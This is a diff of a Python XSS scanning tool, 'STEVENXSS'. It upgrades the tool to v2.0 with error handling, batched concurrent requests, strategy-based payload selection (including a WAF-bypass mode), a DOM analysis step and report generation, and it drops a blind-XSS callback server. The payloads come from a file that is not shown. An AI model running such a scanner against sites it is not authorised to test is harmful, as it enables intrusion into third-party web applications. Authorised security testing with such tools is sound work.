     async def _test_post_payload(self, url: str, param: str, payload: str, post_data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
         """Test payload in POST request"""
-        if post_data and param in post_data:
-            test_data = post_data.copy()
-            test_data[param] = payload
-            return await self.http_client.post(url, test_data, headers)
-        
-        return 0, "", {}
+        try:
+            if post_data and param in post_data:
+                test_data = post_data.copy()
+                test_data[param] = payload
+                return await self.http_client.post(url, test_data, headers)
+            
+            return 0, "", {}
+        except Exception as e:
+            logger.error(f"POST payload test error: {str(e)}")
+            return 0, str(e), {}
     
     def _assess_vulnerability_level(self, analysis: Dict) -> VulnerabilityLevel:
         """Assess vulnerability level based on reflection analysis"""
-        score = analysis['confidence_score']
-        
-        if score >= 80:
-            return VulnerabilityLevel.CRITICAL
-        elif score >= 60:
-            return VulnerabilityLevel.HIGH
-        elif score >= 40:
-            return VulnerabilityLevel.MEDIUM
-        else:
+        try:
+            score = analysis['confidence_score']
+            
+            if score >= 80:
+                return VulnerabilityLevel.CRITICAL
+            elif score >= 60:
+                return VulnerabilityLevel.HIGH
+            elif score >= 40:
+                return VulnerabilityLevel.MEDIUM
+            else:
+                return VulnerabilityLevel.LOW
+        except:
             return VulnerabilityLevel.LOW
     
-    async def comprehensive_scan(self, target_url: str, payloads_file: str, 
-                               method: str = 'GET', post_data: Dict = None,
-                               custom_headers: Dict = None, enable_dom: bool = True,
-                               enable_blind_xss: bool = False) -> List[ScanResult]:
-        """Perform comprehensive XSS scanning"""
+    async def smart_scan(self, target_url: str, payloads_file: str, 
+                        strategy: str = "comprehensive", method: str = 'GET', 
+                        post_data: Dict = None, custom_headers: Dict = None,
+                        enable_dom: bool = True, max_tests: int = None) -> List[ScanResult]:
+        """Perform smart XSS scanning with strategy-based payload selection"""
         
-        DisplayManager.print_section("SCAN INITIALIZATION")
-        DisplayManager.print_info(f"Starting comprehensive scan for {target_url}")
+        DisplayManager.print_section("SMART SCAN INITIALIZATION")
+        DisplayManager.print_info(f"Starting smart scan for {target_url}")
+        DisplayManager.print_info(f"Strategy: {strategy}")
         
-        # Load and enhance payloads
-        base_payloads = self._load_payloads(payloads_file)
-        adaptive_payloads = self.payload_engine.generate_adaptive_payloads()
-        all_payloads = list(set(base_payloads + adaptive_payloads))
+  
+        self.payload_engine.analyze_payload_file(payloads_file)
+        smart_payloads = self.payload_engine.get_smart_payloads(strategy)
         
-        if enable_blind_xss and self.blind_xss:
-            blind_payloads = self.blind_xss.generate_blind_payloads()
-            all_payloads.extend(blind_payloads)
+        if max_tests and len(smart_payloads) > max_tests:
+            smart_payloads = smart_payloads[:max_tests]
+            DisplayManager.print_info(f"Limited to {max_tests} payloads for quick scan")
         
-        DisplayManager.print_success(f"Loaded {len(all_payloads)} payloads for testing")
+        DisplayManager.print_success(f"Selected {len(smart_payloads)} payloads for {strategy} strategy")
         
-        # Extract parameters
+   
         parameters = self._extract_parameters(target_url, post_data)
         if not parameters:
             DisplayManager.print_warning("No parameters found for testing")
@@ -1116,55 +1012,64 @@ class STEVENXSSScanner:
         
         DisplayManager.print_success(f"Found {len(parameters)} parameters to test")
         
-        # Calculate total tests for progress tracking
-        self.stats['total_tests'] = len(parameters) * len(all_payloads)
+
+        self.stats['total_tests'] = len(parameters) * len(smart_payloads)
         self.stats['current_test'] = 0
         
         DisplayManager.print_section("PAYLOAD TESTING")
         DisplayManager.print_info(f"Starting {self.stats['total_tests']} tests...")
         
-        # Test all parameter-payload combinations
+ 
         tasks = []
         for param in parameters:
-            for payload in all_payloads:
+            for payload in smart_payloads:
                 task = self._test_parameter_payload(
                     target_url, param, payload, method, post_data, custom_headers
                 )
                 tasks.append(task)
         
-        # Execute all tests concurrently
-        results = await asyncio.gather(*tasks)
+   
+        batch_size = self.max_concurrency
+        all_results = []
         
-        # Clear progress line
+        for i in range(0, len(tasks), batch_size):
+            batch = tasks[i:i + batch_size]
+            batch_results = await asyncio.gather(*batch)
+            all_results.extend(batch_results)
+        
+   
         print()
         
-        # Process results
-        for result in results:
+      
+        for result in all_results:
             if result:
                 self.results.append(result)
                 self.stats['vulnerabilities_found'] += 1
         
-        # DOM-based XSS analysis
+      
         if enable_dom:
             DisplayManager.print_section("DOM ANALYSIS")
             DisplayManager.print_info("Starting DOM XSS analysis...")
-            dom_analysis = await self.dom_analyzer.analyze_dom_environment(target_url)
-            
-            for vuln in dom_analysis.get('vulnerabilities', []):
-                dom_result = ScanResult(
-                    url=target_url,
-                    parameter="DOM",
-                    payload=vuln['payload'],
-                    context=ScanContext.DOM,
-                    level=VulnerabilityLevel.HIGH,
-                    reflection_data={},
-                    dom_analysis=vuln,
-                    timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
-                    confidence=vuln['confidence']
-                )
-                self.results.append(dom_result)
-                self.stats['vulnerabilities_found'] += 1
-                self.stats['dom_vulnerabilities'] += 1
+            try:
+                dom_analysis = await self.dom_analyzer.analyze_dom_environment(target_url)
+                
+                for vuln in dom_analysis.get('vulnerabilities', []):
+                    dom_result = ScanResult(
+                        url=target_url,
+                        parameter="DOM",
+                        payload=vuln['payload'],
+                        context=ScanContext.DOM,
+                        level=VulnerabilityLevel.HIGH,
+                        reflection_data={},
+                        dom_analysis=vuln,
+                        timestamp=time.strftime('%Y-%m-%d %H:%M:%S'),
+                        confidence=vuln.get('confidence', 70.0)
+                    )
+                    self.results.append(dom_result)
+                    self.stats['vulnerabilities_found'] += 1
+                    self.stats['dom_vulnerabilities'] += 1
+            except Exception as e:
+                DisplayManager.print_error(f"DOM analysis failed: {str(e)}")
         
         DisplayManager.print_success(f"Scan completed. Found {self.stats['vulnerabilities_found']} vulnerabilities")
         return self.results
@@ -1174,26 +1079,31 @@ class STEVENXSSScanner:
         DisplayManager.print_section("REPORT GENERATION")
         DisplayManager.print_info(f"Generating {format.upper()} report...")
         
-        if format == "html":
-            return self._generate_html_report()
-        elif format == "json":
-            return self._generate_json_report()
-        elif format == "text":
-            return self._generate_text_report()
-        else:
-            return self._generate_text_report()
+        try:
+            if format == "html":
+                return self._generate_html_report()
+            elif format == "json":
+                return self._generate_json_report()
+            elif format == "text":
+                return self._generate_text_report()
+            else:
+                return self._generate_text_report()
+        except Exception as e:
+            DisplayManager.print_error(f"Report generation failed: {str(e)}")
+            return f"Error generating report: {str(e)}"
     
     def _generate_html_report(self) -> str:
         """Generate interactive HTML report"""
         scan_duration = self.get_scan_duration()
         
-        html_report = f"""
+        try:
+            html_report = f"""
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>STEVENXSS v1.0 - Security Scan Report</title>
+    <title>STEVENXSS v2.0 - Security Scan Report</title>
     <style>
         body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }}
         .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
@@ -1216,8 +1126,8 @@ class STEVENXSSScanner:
 <body>
     <div class="container">
         <div class="header">
-            <h1>🛡️ STEVENXSS v1.0 Security Scan Report</h1>
-            <p>Advanced DOM XSS Scanner - Developed by STEVEN</p>
+            <h1>🛡️ STEVENXSS v2.0 Security Scan Report</h1>
+            <p>Ultimate DOM XSS Scanner - Smart Payload Engine</p>
         </div>
         
         <div class="stats">
@@ -1241,14 +1151,14 @@ class STEVENXSSScanner:
         
         <h2>📋 Vulnerability Details</h2>
 """
-        
-        if self.results:
-            for i, result in enumerate(self.results):
-                context_badges = "".join([
-                    f'<span class="context-badge {result.context.value}">{result.context.value}</span>'
-                ])
-                
-                html_report += f"""
+            
+            if self.results:
+                for i, result in enumerate(self.results):
+                    context_badges = "".join([
+                        f'<span class="context-badge {result.context.value}">{result.context.value}</span>'
+                    ])
+                    
+                    html_report += f"""
         <div class="vulnerability {result.level.value}">
             <h3>Vulnerability #{i+1} - <span style="color: {'#dc3545' if result.level == VulnerabilityLevel.CRITICAL else '#fd7e14' if result.level == VulnerabilityLevel.HIGH else '#ffc107' if result.level == VulnerabilityLevel.MEDIUM else '#28a745'}">{result.level.value.upper()}</span></h3>
             <p><strong>Parameter:</strong> {result.parameter}</p>
@@ -1260,56 +1170,60 @@ class STEVENXSSScanner:
             <p><strong>Timestamp:</strong> {result.timestamp}</p>
         </div>
 """
-        else:
-            html_report += """
+            else:
+                html_report += """
         <div style="text-align: center; padding: 40px;">
             <h3 style="color: #28a745;">✅ No vulnerabilities detected</h3>
             <p>The target appears to have proper XSS protection measures in place.</p>
         </div>
 """
-        
-        html_report += """
+            
+            html_report += """
     </div>
 </body>
 </html>
 """
-        
-        return html_report
+            
+            return html_report
+        except Exception as e:
+            return f"Error generating HTML report: {str(e)}"
     
     def _generate_json_report(self) -> str:
         """Generate JSON report"""
-        report_data = {
-            'metadata': {
-                'tool': 'STEVENXSS v1.0',
-                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                'scan_duration': self.get_scan_duration()
-            },
-            'statistics': self.stats,
-            'vulnerabilities': [
-                {
-                    'parameter': r.parameter,
-                    'payload': r.payload,
-                    'context': r.context.value,
-                    'level': r.level.value,
-                    'confidence': r.confidence,
-                    'url': r.url,
-                    'http_status': r.http_status,
-                    'timestamp': r.timestamp,
-                    'reflection_analysis': r.reflection_data
-                }
-                for r in self.results
-            ],
-            'successful_contexts': [c.value for c in self.successful_contexts]
-        }
-        
-        return json.dumps(report_data, indent=2, ensure_ascii=False)
+        try:
+            report_data = {
+                'metadata': {
+                    'tool': 'STEVENXSS v2.0',
+                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                    'scan_duration': self.get_scan_duration()
+                },
+                'statistics': self.stats,
+                'vulnerabilities': [
+                    {
+                        'parameter': r.parameter,
+                        'payload': r.payload,
+                        'context': r.context.value,
+                        'level': r.level.value,
+                        'confidence': r.confidence,
+                        'url': r.url,
+                        'http_status': r.http_status,
+                        'timestamp': r.timestamp
+                    }
+                    for r in self.results
+                ]
+            }
+            
+            return json.dumps(report_data, indent=2, ensure_ascii=False)
+        except Exception as e:
+            return f'{{"error": "Report generation failed: {str(e)}"}}'
     
     def _generate_text_report(self) -> str:
         """Generate text report"""
-        scan_duration = self.get_scan_duration()
-        
-        report = f"""
-STEVENXSS v1.0 - Security Scan Report
+        try:
+            scan_duration = self.get_scan_duration()
+            
+            report = f"""
+STEVENXSS v2.0 - Security Scan Report
 =====================================
 
 Scan Statistics:
@@ -1318,15 +1232,15 @@ Scan Statistics:
 • Vulnerabilities Found: {self.stats['vulnerabilities_found']}
 • DOM Vulnerabilities: {self.stats['dom_vulnerabilities']}
 • Scan Duration: {scan_duration:.2f} seconds
-• Successful Contexts: {', '.join([c.value for c in self.successful_contexts])}
+• Successful Tests: {self.stats['successful_tests']}
 
 Vulnerabilities:
 ---------------
 """
-        
-        if self.results:
-            for i, result in enumerate(self.results):
-                report += f"""
+            
+            if self.results:
+                for i, result in enumerate(self.results):
+                    report += f"""
 {i+1}. {result.level.value.upper()} - {result.parameter}
    Payload: {result.payload}
    Context: {result.context.value}
@@ -1335,10 +1249,12 @@ Vulnerabilities:
    HTTP Status: {result.http_status}
    Timestamp: {result.timestamp}
 """
-        else:
-            report += "\nNo vulnerabilities detected.\n"
-        
-        return report
+            else:
+                report += "\nNo vulnerabilities detected.\n"
+            
+            return report
+        except Exception as e:
+            return f"Error generating text report: {str(e)}"
 
 def parse_post_data(post_string: str) -> Dict:
     """Parse POST data from string"""
@@ -1349,98 +1265,111 @@ def parse_post_data(post_string: str) -> Dict:
     try:
         pairs = post_string.split('&')
         for pair in pairs:
-            key, value = pair.split('=', 1)
-            post_data[key] = value
+            if '=' in pair:
+                key, value = pair.split('=', 1)
+                post_data[key] = value
         return post_data
     except Exception as e:
-        DisplayManager.print_error(f"Error parsing POST data: {e}")
+        DisplayManager.print_error(f"Error parsing POST data: {str(e)}")
+        return {}
+
+def load_custom_headers(headers_file: str) -> Dict:
+    """Load custom headers from JSON file"""
+    if not headers_file:
+        return {}
+    
+    try:
+        with open(headers_file, 'r') as f:
+            return json.load(f)
+    except Exception as e:
+        DisplayManager.print_error(f"Error loading headers: {str(e)}")
         return {}
 
 async def main():
     """Main function"""
-    # Display welcome banner
+   
     DisplayManager.print_banner()
     
-    parser = argparse.ArgumentParser(description='STEVENXSS v1.5 - Advanced DOM XSS Scanner')
+    parser = argparse.ArgumentParser(description='STEVENXSS v2.0 - Ultimate DOM XSS Scanner')
     parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
     parser.add_argument('-f', '--file', required=True, help='Payload file path')
     parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
     parser.add_argument('-d', '--data', help='POST data (e.g., "param1=value1&param2=value2")')
     parser.add_argument('-H', '--headers', help='Custom headers JSON file')
-    parser.add_argument('-t', '--threads', type=int, default=50, help='Max concurrent requests')
-    parser.add_argument('--dom', action='store_true', help='Enable DOM XSS analysis')
-    parser.add_argument('--blind-xss', help='Enable blind XSS with callback domain')
-    parser.add_argument('--blind-port', type=int, default=8888, help='Blind XSS callback port')
+    parser.add_argument('-t', '--threads', type=int, default=30, help='Max concurrent requests (default: 30)')
+    parser.add_argument('-s', '--strategy', default='comprehensive', 
+                       choices=['quick', 'comprehensive', 'waf_bypass', 'dom_focused', 'blind_xss'],
+                       help='Scan strategy (default: comprehensive)')
+    parser.add_argument('--no-dom', action='store_true', help='Disable DOM XSS analysis')
+    parser.add_argument('--max-tests', type=int, help='Maximum number of tests to perform')
     parser.add_argument('--report-format', default='html', choices=['html', 'json', 'text'], help='Report format')
     
     args = parser.parse_args()
     
-    # Parse POST data
+  
+    if not os.path.exists(args.file):
+        DisplayManager.print_error(f"Payload file not found: {args.file}")
+        return
+    
+ 
     post_data = parse_post_data(args.data) if args.data else {}
+    custom_headers = load_custom_headers(args.headers) if args.headers else {}
     
-    # Load custom headers
-    custom_headers = {}
-    if args.headers:
-        try:
-            with open(args.headers, 'r') as f:
-                custom_headers = json.load(f)
-        except Exception as e:
-            DisplayManager.print_error(f"Error loading headers: {e}")
-    
-    # Initialize scanner
+ 
     scanner = STEVENXSSScanner(max_concurrency=args.threads)
     
-    # Initialize blind XSS if enabled
-    blind_xss = None
-    if args.blind_xss:
-        blind_xss = BlindXSSIntegration(args.blind_xss, args.blind_port)
-        await blind_xss.start_callback_server()
-        scanner.blind_xss = blind_xss
-    
     try:
-        await scanner.initialize()
+     
+        if not await scanner.initialize():
+            return
         
-        # Perform scan
+     
         DisplayManager.print_section("SCAN STARTED")
-        results = await scanner.comprehensive_scan(
+        results = await scanner.smart_scan(
             target_url=args.url,
             payloads_file=args.file,
+            strategy=args.strategy,
             method=args.method,
             post_data=post_data,
             custom_headers=custom_headers,
-            enable_dom=args.dom,
-            enable_blind_xss=bool(args.blind_xss)
+            enable_dom=not args.no_dom,
+            max_tests=args.max_tests
         )
         
-        # Generate report
+       
         report = scanner.generate_report(args.report_format)
-        
-        # Save report
+       
         timestamp = int(time.time())
         report_file = f'stevenxss_report_{timestamp}.{args.report_format}'
-        with open(report_file, 'w', encoding='utf-8') as f:
-            f.write(report)
+        try:
+            with open(report_file, 'w', encoding='utf-8') as f:
+                f.write(report)
+            DisplayManager.print_success(f"Report saved: {report_file}")
+        except Exception as e:
+            DisplayManager.print_error(f"Failed to save report: {str(e)}")
         
-        DisplayManager.print_success(f"Scan completed. Found {len(results)} vulnerabilities")
-        DisplayManager.print_success(f"Report saved: {report_file}")
-        
-        # Print blind XSS statistics if enabled
-        if blind_xss:
-            stats = blind_xss.get_callback_statistics()
-            DisplayManager.print_info(f"Blind XSS callbacks received: {stats['total_callbacks']}")
-        
-        # Print summary to console - حساب الوقت هنا بعد انتهاء المسح مباشرة
+       
         scan_duration = scanner.get_scan_duration()
         DisplayManager.print_section("SCAN SUMMARY")
         print(f"{TerminalColors.GREEN}🎯 Total Vulnerabilities: {TerminalColors.WHITE}{len(results)}{TerminalColors.END}")
         print(f"{TerminalColors.YELLOW}🔍 DOM Vulnerabilities: {TerminalColors.WHITE}{scanner.stats['dom_vulnerabilities']}{TerminalColors.END}")
         print(f"{TerminalColors.CYAN}⏱️  Scan Duration: {TerminalColors.WHITE}{scan_duration:.2f}s{TerminalColors.END}")
-        print(f"{TerminalColors.MAGENTA}📄 Report File: {TerminalColors.WHITE}{report_file}{TerminalColors.END}")
+        print(f"{TerminalColors.MAGENTA}📊 Successful Tests: {TerminalColors.WHITE}{scanner.stats['successful_tests']}{TerminalColors.END}")
+        print(f"{TerminalColors.BLUE}🚀 Strategy Used: {TerminalColors.WHITE}{args.strategy}{TerminalColors.END}")
         
+    except KeyboardInterrupt:
+        DisplayManager.print_warning("Scan interrupted by user")
+    except Exception as e:
+        DisplayManager.print_error(f"Scan failed: {str(e)}")
     finally:
         await scanner.close()
-        if blind_xss:
-            await blind_xss.stop_callback_server()
 
 if __name__ == "__main__":
+
+    if os.path.exists('/etc/os-release'):
+        with open('/etc/os-release', 'r') as f:
+            if 'kali' in f.read().lower():
+                DisplayManager.print_info("Kali Linux detected - Optimized configuration enabled")
+    
+   
     asyncio.run(main())
